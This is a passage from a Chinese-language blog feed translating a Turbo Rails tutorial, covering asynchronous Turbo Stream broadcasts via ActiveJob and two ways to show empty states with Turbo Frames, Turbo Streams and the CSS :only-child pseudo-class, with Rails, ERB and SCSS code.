  after_update_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_replace_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
  after_destroy_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_remove_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试一下，发现功能又完成了，我们在 rails console 中看看到底发生了什么</p>
<p>执行：确保数据库有数据</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Quote.last.destroy<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除数据，提交事务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Quote Load <span class="token punctuation">(</span><span class="token number">0</span>.3ms<span class="token punctuation">)</span>  SELECT <span class="token string">"quotes"</span>.* FROM <span class="token string">"quotes"</span> ORDER BY <span class="token string">"quotes"</span><span class="token builtin class-name">.</span><span class="token string">"id"</span> DESC LIMIT ?  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"LIMIT"</span>, <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
TRANSACTION <span class="token punctuation">(</span><span class="token number">0</span>.1ms<span class="token punctuation">)</span>  begin transaction
Quote Destroy <span class="token punctuation">(</span><span class="token number">0</span>.4ms<span class="token punctuation">)</span>  DELETE FROM <span class="token string">"quotes"</span> WHERE <span class="token string">"quotes"</span><span class="token builtin class-name">.</span><span class="token string">"id"</span> <span class="token operator">=</span> ?  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"id"</span>, <span class="token number">908005754</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
TRANSACTION <span class="token punctuation">(</span><span class="token number">1</span>.4ms<span class="token punctuation">)</span>  commit transaction<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>提交事务后，进行<code>after_destroy_commit</code>的模型回调，并调用<code>broadcast_remove_to</code>。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>ActionCable<span class="token punctuation">]</span> Broadcasting to quotes: <span class="token string">"&lt;turbo-stream action=<span class="token entity" title="\&quot;">\"</span>remove<span class="token entity" title="\&quot;">\"</span> target=<span class="token entity" title="\&quot;">\"</span>quote_908005754<span class="token entity" title="\&quot;">\"</span>>&lt;/turbo-stream>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>页面中用户从<code>quotes</code>流中获取数据，并且让Turbo去删除id为<code>quote_908005754</code>的DOM节点，然后这部分就是要被删除的。</p>
<p><img src="../../../../public/img/image-20230608105152332.png" alt="image-20230608105152332"></p>
<p>最终，这条quote数据就消失在<code>Quotes#index</code>页面中。</p>
<p><img src="../../../../public/img/image-20230608105234463.png" alt="image-20230608105234463"></p>
<p>就这样，我们改造了我们的增删改查，不过在进入下一章前，我们聊聊性能。</p>
<h2 id="Making-broadcasting-asynchronous-with-ActiveJob"><a href="#Making-broadcasting-asynchronous-with-ActiveJob" class="headerlink" title="Making broadcasting asynchronous with ActiveJob"></a>Making broadcasting asynchronous with ActiveJob</h2><p>现在我们的<code>Quote</code>模型长这个样子</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  after_create_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_prepend_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
  after_update_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_replace_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
  after_destroy_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_remove_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以通过使广播异步化去提升我们代码的性能，为了这一点，我们需要使用异步等价的语法去修改回调内容。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  after_create_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_prepend_later_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
  after_update_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_replace_later_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
  after_destroy_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_remove_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p><strong>注意：</strong>prepend,replace都有_later_to方法，但remove没有，因为当一条quote被数据库删除了，那异步任务就没法在之后去检索这条数据执行任务了</p>
<hr>
<p>让我们在 rails console 中测试一下，看一些有什么区别</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Quote.create<span class="token operator">!</span><span class="token punctuation">(</span>name: <span class="token string">"Asynchronous quote"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>看看最新的日志，我们发现创建数据的日志和之前一样，但是广播的部分被异步化了，一个<code>Turbo::Streams::ActionBroadcastJob</code>加入了队列，并附带了必要的数据，用来后续的广播</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">Enqueued Turbo<span class="token double-colon punctuation">::</span>Streams<span class="token double-colon punctuation">::</span>ActionBroadcastJob <span class="token punctuation">(</span>Job <span class="token constant">ID</span><span class="token operator">:</span> <span class="token number">1</span>eecd0c8<span class="token operator">-</span><span class="token number">53</span>fd<span class="token operator">-</span><span class="token number">43</span>ed<span class="token operator">-</span>af8a<span class="token operator">-</span><span class="token number">073</span>b7d85c2fe<span class="token punctuation">)</span> to Async<span class="token punctuation">(</span>default<span class="token punctuation">)</span> with arguments<span class="token operator">:</span> <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token symbol">:action</span><span class="token operator">=></span><span class="token symbol">:prepend</span><span class="token punctuation">,</span> <span class="token symbol">:target</span><span class="token operator">=></span><span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token symbol">:targets</span><span class="token operator">=></span><span class="token keyword">nil</span><span class="token punctuation">,</span> <span class="token symbol">:locals</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token symbol">:quote</span><span class="token operator">=></span><span class="token comment">#&lt;GlobalID:0x00007f9a39e861a8 @uri=#&lt;URI::GID gid://hotwire-course/Quote/908005756>>&#125;, :partial=>"quotes/quote"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后这个任务就被渲染为<code>quotes/_quote.html.erb</code>局部视图那样</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">Performing Turbo<span class="token double-colon punctuation">::</span>Streams<span class="token double-colon punctuation">::</span>ActionBroadcastJob <span class="token punctuation">(</span>Job <span class="token constant">ID</span><span class="token operator">:</span> <span class="token number">1</span>eecd0c8<span class="token operator">-</span><span class="token number">53</span>fd<span class="token operator">-</span><span class="token number">43</span>ed<span class="token operator">-</span>af8a<span class="token operator">-</span><span class="token number">073</span>b7d85c2fe<span class="token punctuation">)</span> from Async<span class="token punctuation">(</span>default<span class="token punctuation">)</span> enqueued at <span class="token number">2021</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">16</span>T17<span class="token operator">:</span><span class="token number">24</span><span class="token operator">:</span><span class="token number">32</span>Z with arguments<span class="token operator">:</span> <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token symbol">:action</span><span class="token operator">=></span><span class="token symbol">:prepend</span><span class="token punctuation">,</span> <span class="token symbol">:target</span><span class="token operator">=></span><span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token symbol">:targets</span><span class="token operator">=></span><span class="token keyword">nil</span><span class="token punctuation">,</span> <span class="token symbol">:locals</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token symbol">:quote</span><span class="token operator">=></span><span class="token comment">#&lt;GlobalID:0x00007f9a3e03a630 @uri=#&lt;URI::GID gid://hotwire-course/Quote/908005756>>&#125;, :partial=>"quotes/quote"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>异步广播Turbo Stream是我们性能优化的首选之举。</p>
<h2 id="更多的语法题"><a href="#更多的语法题" class="headerlink" title="更多的语法题"></a>更多的语法题</h2><p>如果我们的模型拥有多个实时性任务，我们会注意到回调函数写的都很类似，而Rails就是一个约定大于配置的框架，所以让我们使用语法题去避免重复的语句，让我们来修改模型吧。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  <span class="token comment"># after_create_commit -> &#123; broadcast_prepend_later_to "quotes" &#125;</span>
  <span class="token comment"># after_update_commit -> &#123; broadcast_replace_later_to "quotes" &#125;</span>
  <span class="token comment"># after_destroy_commit -> &#123; broadcast_remove_to "quotes" &#125;</span>
  <span class="token comment"># Those three callbacks are equivalent to the following single line</span>
  broadcasts_to <span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">(</span>quote<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token symbol">inserts_by</span><span class="token operator">:</span> <span class="token symbol">:prepend</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>三个回到等同于下面的一行代码，我们将会在下一章（安全性）中讨论为什么需要lambda表达式。现在我们只需要知道，我们的增删改都被异步的广播到了<code>quotes</code>流中。</p>
<p>我们的模型别简化为：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  broadcasts_to <span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">(</span>quote<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token symbol">inserts_by</span><span class="token operator">:</span> <span class="token symbol">:prepend</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Wrap-up"><a href="#Wrap-up" class="headerlink" title="Wrap up"></a>Wrap up</h2><p>让我们的项目具有实时性，我们只需要简单的两行代码</p>
<ul>
<li>模型中，我们设置增删改的回调方法，而得助于约定，三个回调被定义为一行代码</li>
<li><code>Quotes#index</code>页面中，我们定义关注<code>quotes</code>流</li>
</ul>
<p>剩下的事儿就交给Turbo完成吧</p>
<p>下一章，我们将会聊聊安全相关内容，我们将讨论如何让Turbo Stream确保被不会广播数据到异常的用户那里。</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第八章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E5%85%AB%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<h1 id="Two-ways-to-handle-empty-states-with-Hotwire"><a href="#Two-ways-to-handle-empty-states-with-Hotwire" class="headerlink" title="Two ways to handle empty states with Hotwire"></a>Two ways to handle empty states with Hotwire</h1><p>本章节中，我们将会学习两种方式去使用Turbo控制空状态页，第一种使用<code>Turbo Frames and Turbo Streams</code>，第二种使用<code> the only-child CSS pseudo-class.</code></p>
<h2 id="Adding-empty-states-to-our-Ruby-on-Rails-applications"><a href="#Adding-empty-states-to-our-Ruby-on-Rails-applications" class="headerlink" title="Adding empty states to our Ruby on Rails applications"></a>Adding empty states to our Ruby on Rails applications</h2><p>空状态页是我们系统中最重要的一部分，当我们第一次访问页面时，页面上没有任何提示让我们知道这个页面能干嘛。所以如果当一个新用户访问我们系统时，显示一点儿图片或者几句话可以更好的表达页面可以操作什么。</p>
<p>如果我们删除了所有的quotes数据，我们的页面也就只剩下标题和按钮了，所以当数据为空时，使用空状态页也会是一个好的选择。让我们开始吧</p>
<h2 id="Empty-states-with-Turbo-Frames-and-Turbo-Streams"><a href="#Empty-states-with-Turbo-Frames-and-Turbo-Streams" class="headerlink" title="Empty states with Turbo Frames and Turbo Streams"></a>Empty states with Turbo Frames and Turbo Streams</h2><p>在敲代码之前，让我们花点儿时间，用草图描述一下将要干嘛。当一个用户没有数据时，我们想展示包含提示信息的空状态</p>
<p><img src="../../../../public/img/image-20230617223354649.png" alt="image-20230617223354649"></p>
<ul>
<li>如果用户点击header中的<code>New quote</code>按钮，Turbo会使用<code>Quotes#new</code>页面中的frame替换<code>Quotes#index</code>页面中，id为<code>new_quote</code>的frame。</li>
<li>当用户点击空状态中的<code>Add quote</code>按钮时，Turbo一样会使用<code>Quotes#new</code>页面中的数据替换<code>Quotes#index</code>的frame</li>
</ul>
<p>如上面所讲，不管用户点击哪个链接，空状态都会被<code>new quote form</code>替换掉，页面的状态如下图展示：</p>
<p><img src="../../../../public/img/image-20230618084405067.png" alt="image-20230618084405067"></p>
<p>当用户提交表单数据，行为也不会发生改变</p>
<ol>
<li>新创建的数据放到表单最前面</li>
<li>嵌套id为<code>new_quote</code>的frame的HTML被删除</li>
</ol>
<p>如下图所示</p>
<p><img src="../../../../public/img/image-20230618084619435.png" alt="image-20230618084619435"></p>
<p>如果你刷新页面，只要至少有一条数据，空状态页就不会再显示</p>
<p>现在我们需求明确了，开始敲代码吧，第一件事儿就是在页面中没有数据时，展示空状态页，为此，我们创建一个空状态的局部视图，并用在<code>Quotes#index</code>页面</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/_empty_state.html.erb %></span>

<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"empty-state"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"empty-state__text"</span></span><span class="token operator">></span>
    You don't have any quotes yet<span class="token operator">!</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Add quote"</span></span><span class="token punctuation">,</span> new_quote_path<span class="token punctuation">,</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span> <span class="token string-literal"><span class="token string">%>
&lt;/div></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们可以在用户没有数据时，渲染空状态页到<code>Quotes#index</code>页面中</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/index.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream_from current_company<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token string-literal"><span class="token string">%>

&lt;div class="container"></span></span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"header"</span></span><span class="token operator">></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>Quotes<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"New quote"</span></span><span class="token punctuation">,</span>
                new_quote_path<span class="token punctuation">,</span>
                <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span><span class="token punctuation">,</span>
                <span class="token symbol">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">turbo_frame</span><span class="token operator">:</span> dom_id<span class="token punctuation">(</span><span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag <span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
    &lt;% if @quotes.none? %></span></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"quotes/empty_state"</span></span> <span class="token string-literal"><span class="token string">%>
    &lt;% end %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>

  &lt;%= turbo_frame_tag "quotes" do %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token variable">@quotes</span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在浏览器测试之前，我们来给空状态页增加点儿样式，让更美观一点儿</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_empty_state.scss

.empty-state</span> <span class="token punctuation">&#123;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border-style</span><span class="token punctuation">:</span> dashed<span class="token punctuation">;</span>
  <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>

  <span class="token selector">&amp;__text</span> <span class="token punctuation">&#123;</span>
    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-l<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-text-header<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-l<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>别忘了导入到 manifest 文件中</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/application.sass.scss

// All the previous code
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/empty_state"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在就可以测试了。</p>
<p>在<code>Quotes#index</code>页面中，我们先删除所有的数据，当我们点击<code>New quote or Add quote</code>按钮时，我们可以看到创建表单替换了空状态页，如果我们提交正常数据，新数据就会被放到最上面，空状态页也不再显示。</p>
<p>然后我们仍然需要做一些改进，如果我们删除了刚刚创建的数据，空状态页并没有回到屏幕上，我们希望只要没有数据了，就显示空状态页，为此我们需要修改<code>destory.turbo_stream.erb</code>去更改id为<code>new_quote</code>的frame的内容。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/destroy.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>remove <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;%= render_turbo_stream_flash_messages %></span></span>

<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">unless</span> current_company<span class="token punctuation">.</span>quotes<span class="token punctuation">.</span>exists<span class="token operator">?</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= turbo_stream.update Quote.new do %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"quotes/empty_state"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在，一切如期运转。</p>
<p>然而，我们当前的实现方案，有一个很容易被忽略的问题，在第五章，第六章，我们使用Turbo Stream去订阅：创建，修改，删除的信息通道在<code>Quotes#index</code>页面，因此，当我还是空状态页时，如果这时候有人创建了一条数据，我这里是可以看到，但是空状态页仍然保留在页面上。</p>
<p>让我们讨论一下问题为什么发生，并如何去解决</p>
<h2 id="Empty-states-with-the-only-child-CSS-pseudo-class"><a href="#Empty-states-with-the-only-child-CSS-pseudo-class" class="headerlink" title="Empty states with the only-child CSS pseudo-class"></a>Empty states with the only-child CSS pseudo-class</h2><p>在讨论使用Turbo第二种控制空状态页的方式前，我们再来把问题复现一下，我们来到<code>Quotes#index</code>页面，并删除所有数据，然后我们在控制台中创建一个新的数据，然后新数据会被广播到浏览器页面中，然后我们就会发现空状态页和数据会同时显示在页面上。</p>
<hr>
<p><strong>注意：</strong>我们这里的例子可能比较繁琐，但让我们花点儿时间想象一下数据被通知，就像Github里的通知一样。</p>
<ol>
<li>当我们页面中没有数据通知时，我们希望展示空状态页</li>
<li>当我们通知到达页面时，我们想让空状态页消失</li>
<li>当我们删除通知数据时，我们希望空状态页再次返回</li>
</ol>
<p>这就是这部分我们要完成的任务，并且通知是一个很好的例子</p>
<hr>
<p>让我们通过第五章，第六章来分析一下这里的问题，在<code>Quote</code>模型中使用<code>broadcasts_to</code>方法</p>
<ul>
<li>当数据创建时，<code>quotes/_quote.html.erb</code>视图中的内容被渲染到列表前面</li>
<li>当数据删除时，这条数据从列表中删除</li>
</ul>
<p>默认的，并没有对空状态页提及，如果我们修改<code>broadcasts_to</code>方法的默认选项，使用回调和重写，就有一些巧妙的方法来实现我们想要的功能，归功于CSS中的<code>:only-child pseudo-class</code>，我们在下面陈列想要实现的行为</p>
<ul>
<li>当空状态是<code>the only child of the quotes list</code>，我们想让它展示出来</li>
<li>当空状态不是<code>the only child of the quotes list</code>，我们想让它消失</li>
</ul>
<p><strong>这次行为与之前第一种实现方式有一些小小的不同，这次我们不会使用创建表单替换空状态页</strong></p>
<p>让我们开始敲代码吧，首先我们需要把<code>quotes/empty_state</code>局部视图内容放到数据列表中</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/index.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream_from current_company<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token string-literal"><span class="token string">%>

&lt;div class="container"></span></span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"header"</span></span><span class="token operator">></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>Quotes<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"New quote"</span></span><span class="token punctuation">,</span>
                new_quote_path<span class="token punctuation">,</span>
                <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span><span class="token punctuation">,</span>
                <span class="token symbol">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">turbo_frame</span><span class="token operator">:</span> dom_id<span class="token punctuation">(</span><span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag <span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token string-literal"><span class="token string">%>

  &lt;%= turbo_frame_tag "quotes" do %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"quotes/empty_state"</span></span> <span class="token string-literal"><span class="token string">%>
    &lt;%= render @quotes %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>
&lt;/div></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后我们在CSS中使用``:only-child<code> pseudo-class</code>，当空状态页是id为quotes的Turbo Frame中唯一子节点时显示，如果不是，则再隐藏</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_empty_state.scss

.empty-state</span> <span class="token punctuation">&#123;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border-style</span><span class="token punctuation">:</span> dashed<span class="token punctuation">;</span>
  <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>

  <span class="token selector">&amp;__text</span> <span class="token punctuation">&#123;</span>
    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-l<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-text-header<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-l<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;--only-child</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>

    <span class="token selector">&amp;:only-child</span> <span class="token punctuation">&#123;</span>
      <span class="token property">display</span><span class="token punctuation">:</span> revert<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这里，我们使用了一个修饰符来支持本章介绍的两种方法，以便使用相同的.empty-state类。</p>
<p>在我们的空状态页视图中，我们需要明确的指定”Add quote”链接到id为<code>new_quote</code>的Turbo Frame，我们使用<code>data-turbo-frame=&quot;new_quote&quot;</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/_empty_state.html.erb %></span>

<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"empty-state empty-state--only-child"</span></span><span class="token operator">></span>
